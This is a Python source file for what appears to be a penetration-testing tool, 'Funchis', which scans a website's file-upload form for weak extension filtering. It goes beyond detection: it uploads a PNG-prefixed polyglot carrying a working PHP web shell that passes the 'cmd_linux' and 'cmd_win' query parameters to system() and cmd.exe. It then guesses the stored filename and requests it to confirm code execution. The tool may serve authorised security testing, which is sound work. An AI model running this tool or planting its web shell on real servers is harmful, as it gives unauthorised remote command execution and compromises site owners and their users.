#!/usr/bin/python3
import difflib
import sys
from bs4 import BeautifulSoup
import requests
import re
import argparse
import hashlib

parser = argparse.ArgumentParser(description="File Upload Vulnerability Assessment Tool")
parser.add_argument("URL", help="insert URL")
parser.add_argument("--cookies", default='', required=False, help='insert Cookies "PHPSESSID=<cookies>, Cookies=<cookies>"')
parser.add_argument("--proxy", "-x", default='', required=False, help="redirect trafic trought proxy <127.0.0.1:8080>")
parser.add_argument("--csrf", default=False, required=False, action="store_true", help="csrf token")
parser.add_argument("--upload", "-u", default=False, required=False, help="Directory where webapp stores uploaded file")
parser.add_argument("-v", "--verbose", action="count", default=0, help = "Verbose mode")
args = parser.parse_args()


def banner():
    print("\033[32m" + r"""

    ______                 __    _     
   / ____/_  ______  _____/ /_  (_)____
  / /_  / / / / __ \/ ___/ __ \/ / ___/
 / __/ / /_/ / / / / /__/ / / / (__  ) 
/_/    \__,_/_/ /_/\___/_/ /_/_/____/      

    File Upload Vulnerability Scanner
    v1.0

""" + "\033[0m")


###GLOBAL VARIABLE DEF
URL = args.URL
cookies = args.cookies
proxy = args.proxy
CSRF = args.csrf
upload_dir = args.upload


def regex_url(text_to_sanitize: str) -> str:
    """
    Function used to prepare the URL correctly so that it is in the following format
    http://<$ip>/

    :param text_to_sanitize: IP to sanitize and put in the correct format
    :return: sanitized value
    """

    if not text_to_sanitize.startswith(('http://', 'https://')):
        text_to_sanitize = "http://" + text_to_sanitize

    if not text_to_sanitize.endswith('/'):
        text_to_sanitize = text_to_sanitize + "/"

    return text_to_sanitize


def guessing_file_name(value_to_validate: list, extension: str, fake_image: str) -> dict[str, list[str]]:
    """
    Tests only file extensions that appear to be accepted by the application.
    Generates possible filenames used by the application when storing uploaded files.

    This is done by:
    (1) Parsing the server response to identify declared filenames
    (2) Hashing the uploaded file content using MD5 and SHA1 (some applications store files using hashes)

    :param value_to_validate: difference in response body between a known valid request
                            (valid_request_values["text_body"]) and the request under test
                            (to_be_validate_request_values["text_body"]); used to identify new
                            filenames with potentially valid extensions not present in the original response

    :param extension: uploaded file name (e.g., "test.php")
    :param fake_image: fake image used for upload (PNG content with embedded PHP code)
    :return: possible filenames used to store uploaded files
    """

    list_ = [extension]
    extension_regex = extension.split(".")[-1]  # php

    ### (1)
    for word in value_to_validate:
        match = re.search(rf"[A-Za-z0-9_-]+\.{extension_regex}$",word)  # Match only name.php not " .php" or other special characters
        if match and match.group(0) != extension:
            list_.append(match.group())

    ### (2)
    md5 = hashlib.md5(fake_image).hexdigest() + '.' + extension_regex
    sha1 = hashlib.sha1(fake_image).hexdigest() + '.' + extension_regex
    if md5 not in list_:
        list_.append(md5)
    if sha1 not in list_:
        list_.append(sha1)

    name_to_test = {extension: list_}
    return name_to_test


def test_upload(upload_dir: str, name_to_test: dict, s) -> None:
    """
    This function tests all the possible filenames in which the application might have saved the uploaded file

    :param upload_dir: directory where accepted files are uploaded
    :param name_to_test: contains all possible names with which the application might have saved the file
    """

    match = re.match(r"(https?://[^/]+)", URL)
    base_url = match.group(1) + "/"

    if upload_dir.startswith('/'):
        upload_dir = upload_dir.replace('/', '', 1)
    if not upload_dir.endswith('/'):
        upload_dir = upload_dir + '/'

    for key, values in name_to_test.items():
        for value in values:
            url = base_url + upload_dir + value
            response = s.get(url)
            if response.status_code == 200:
                vprint ("file {} successfully uploaded with name: {}".format(key, value))
                if "__funchis__4005__kyra__" in response.text.lower():
                    print("\033[34m{}\033[00m \033[33m(Pwnd!)\033[0m".format(url))
                break


def extract_input_form(s) -> tuple[str, str, str, dict]:
    """
    Extracts the fields to be submitted in the post request to perform the image upload.
    If no upload function exists, the script execution is terminated.
    :return: name, action, method, tags_array
    - name: name of the file-type input field (e.g., "fileToUpload")
    - action: name of the PHP file being uploaded (e.g., "upload.php")
    - method: method to use for the upload (e.g., "post")
    - tags_array: array containing the required fields (including hidden ones) to be sent with the image (e.g., {"PHPSESSID": "testcookies", "CSRFToken": "testtoken"})
    """
    r = s.get(URL)
    r.raise_for_status()  # Check if the request was successful (status code 200-299);
    html_content = r.text

    # Parsing HTML content
    soup = BeautifulSoup(html_content, 'html.parser')
    tags = soup.find_all('form')
    for tag in tags:
        found = False  # Verify if update the fields to send in the post or not (through tags_array)
        tags_array = {}  # Define values to pass in the post (for hidden fields)

        # Search for all forms that have an input of type file (file upload)
        input_form = tag.find_all('input')  # Takes all input tags in the form

        for input_test in input_form:
            if input_test.get('type') == 'file':
                action = tag.get('action')  # Contains the name of the PHP file that performs the upload (upload.php)
                method = tag.get('method')
                # img_src = soup.find('img').get('src') #Find where the image is saved
                # Extract input data for upload name
                name = input_test.get('name')
                found = True

        if found:
            for input_test in input_form:
                if input_test.get('name') and input_test.get('value') and (input_test.get('type') == "hidden" or input_test.get('type') == "submit"):
                    tags_array.update({input_test.get('name'): input_test.get('value')})
            break

    if not found:
        print("No Upload Function Found")
        sys.exit(1)

    return name, action, method, tags_array


def clean_html_text(html: str) -> str:
    """
    Sanitize response output to extract only visible text, removing HTML tags, scripts, styles, and normalizing whitespace. This helps to compare the textual content more effectively between the two responses valid_request and to_be_validate_request, ignoring formatting differences or non-visible elements.
    :param html: HTML content to sanitize
    :return: clean and normalized text
    """
    soup_san = BeautifulSoup(html, "html.parser")

    # Remove Noise (script, style, etc.)
    for tag in soup_san(["script", "style"]):
        tag.extract()

    # Extract Visible Text
    text = soup_san.get_text(separator="\n")

    # Normalize whitespace
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    return "\n".join(lines)


def ext_validator(valid_request_values: dict, to_be_validate_request_values: dict, extension: str, fake_image: str) -> tuple[bool, str, dict[str, list[str]]]:
    """
    Validates the file extension under test (e.g., "test.php") by comparing it against a known allowed extension (.png).

    :param valid_request_values: dictionary containing values from the valid request ("redirect", "status_code", "text_body")
    :param to_be_validate_request_values: dictionary containing values from the request under test ("redirect", "status_code", "text_body")
    :param extension: file name to validate (e.g., "test.php")
    :param fake_image: fake image used for upload (PNG content with embedded PHP code)
    :return: tuple containing validation result, a message, and a dictionary of candidate values
    """

    deny_keywords = ["invalid", "forbidden", "denied", "blocked", "rejected", "refused", "prohibited", "unauthorized",
                     "restricted", "banned", "disallowed", "unsupported", "unacceptable", "error", "failed", "failure",
                     "illegal", "dangerous", "unsafe", "violation", "policy", "exceeded", "limit", "validation", "not",
                     "only"]

    if not valid_request_values["redirect"] == to_be_validate_request_values["redirect"]:
        return False, "different redirect status", {}
    elif not valid_request_values["status_code"] == to_be_validate_request_values["status_code"]:
        return False, "no matching status_code", {}
    else:
        diff1 = clean_html_text(valid_request_values["text_body"])  # Cleaning for better comparison between the two responses
        diff2 = clean_html_text(to_be_validate_request_values["text_body"])
        diff = difflib.ndiff(diff1.split(), diff2.split())
        value_to_validate = [line.lower().replace('+ ', '') for line in diff if line.startswith('+ ')]  # or line.startswith('- ')]
        if value_to_validate: vprint(value_to_validate) #Shows the text in the body that differs between the two responses (valid request and request under test)
        if any(word in deny_keywords for word in value_to_validate):
            return False, "body", {}
        else:
            name_to_test = guessing_file_name(value_to_validate, extension, fake_image)
            return True, "", name_to_test


def run_scan(s):
    """
    Main scanning routine.

    Performs the following steps:
    (1) Identifies the upload form and required parameters
    (2) Sends a baseline request using a known valid file (PNG)
    (3) Tests multiple potentially dangerous extensions (e.g., .php variants)
    (4) Compares responses to detect filtering mechanisms
    (5) Collects extensions that appear to be allowed
    (6) Optionally attempts to locate uploaded files on the server

    :param s: initialized requests session
    """

    php_extensions = ["test.php", "test.php2", "test.php3", "test.php4", "test.php5", "test.php6", "test.php7",
                      "test.phps", "test.pht", "test.phtml",
                      "test.phar"]
    allowed = []
    not_allowed = []

    name, action, method, tags_array = extract_input_form(s)

    # Testing Valid Extensions      '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82'   <-- Original Image
    fake_image = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\xdac\xfc\xff\x9f\xa1\x1e\x00\x07\x82\x02\x7f=\xc8H\xef\x00\x00\x00\x00IEND\xaeB`\x82<html><body><h1><?php echo "__FUnchis__".(2002+2003)."__KYra__"; ?></h1><h3>Linux Backend</h3><form method="GET"><input type="TEXT" name="cmd_linux" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_linux"])){ system($_GET["cmd_linux"]." 2>&1"); } ?></pre><h3>Windows Backend</h3><form method="GET"><input type="TEXT" name="cmd_win" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET["cmd_win"])){ system("cmd.exe /c ".$_GET["cmd_win"]." 2>&1"); } ?></pre></body></html>\n'
    files = {name: ('test.png', fake_image, "image/png")}
    r = s.post(URL + action, files=files, data=tags_array, allow_redirects=True)
    print ("Making Request: \033[34m {}\033[00m\n".format(URL + action))
    r.raise_for_status()
    valid_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
    vprint("Baseline response values: {}\n".format(valid_request_values))
    name_to_test = {}

    for extension in php_extensions:
        vprint ("Testing extension: \033[97m {}\033[00m".format(extension))
        # PNG Magic Byte -> b'\x89PNG\r\n\x1A\n' || Minimal PNG image -> https://png-pixel.com/?utm_source=chatgpt.com
        files = {name: (extension, fake_image, "image/png")}
        if CSRF: name, action, method, tags_array = extract_input_form(s)
        r = s.post(URL + action, files=files, data=tags_array, allow_redirects=True)
        to_be_validate_request_values = {"status_code": r.status_code, "redirect": r.is_redirect, "text_body": r.text}
        result, message_occurred, data = ext_validator(valid_request_values, to_be_validate_request_values, extension, fake_image)

        if result:
            vprint("Extension seems to be Allowed\n")
            name_to_test.update(data)
            allowed.append(extension)
        else:
            vprint ("Possible filter in posture, found in {} \n".format(message_occurred))
            not_allowed.append(extension)

    print("Allowed: {}".format(allowed))
    vprint("Not Allowed: {}\n".format(not_allowed))

    if upload_dir: test_upload(upload_dir, name_to_test, s)


def init_session():
    # Inizialize Session
    s = requests.session()

    # Define Proxy
    if proxy:
        s.proxies.update({'http': proxy, 'https': proxy})
        s.verify = False

    # Define Cookies
    cookies_normalized = {}
    if cookies:
        # OutPut expected --> {'PHPSESSID': 'testcookies', 'COOKIES': "ABCD"}
        cookies_normalized = {cookie.split('=')[0]: cookie.split('=')[1] for cookie in cookies.strip().split(", ")}
        for key, value in cookies_normalized.items():
            s.cookies.set(key, value)
    return s



def vprint(msg: str):
    """
    Helper function to control user-facing verbose output.

    :param msg: message to print
    """

    if args.verbose > 0:
        print(msg)



def main():
    global URL
    banner()
    URL = regex_url(args.URL)
    s = init_session()
    print("[+] Starting Fuzzing ...\n")
    run_scan(s)


if __name__ == "__main__":
    main()